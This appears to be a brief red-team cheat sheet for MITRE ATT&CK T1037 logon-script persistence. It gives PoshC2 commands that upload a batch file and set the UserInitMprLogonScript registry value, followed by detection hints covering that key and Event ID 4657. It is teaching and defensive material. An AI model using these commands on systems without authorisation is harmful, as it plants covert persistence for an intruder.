# [Logon scripts](https://attack.mitre.org/techniques/T1037/)

## Exploit syntax:
In Poshc2, run
```sh
upload-file -source /tmp/test.bat -destination "c:\temp\test.bat" #Upload your batch file on the box

sharpreg create HKCU\Environment UserInitMprLogonScript "C:\test.bat" #Create the key and populate its value with the location of the file you uploaded
```
## Detections techniques:
* Investigate file creation in the default windows logon script location in the registry. HKEY_CURRENT_USER\Environment "UserInitMprLogonScript"
* Event ID 4657 is made when the registry is modified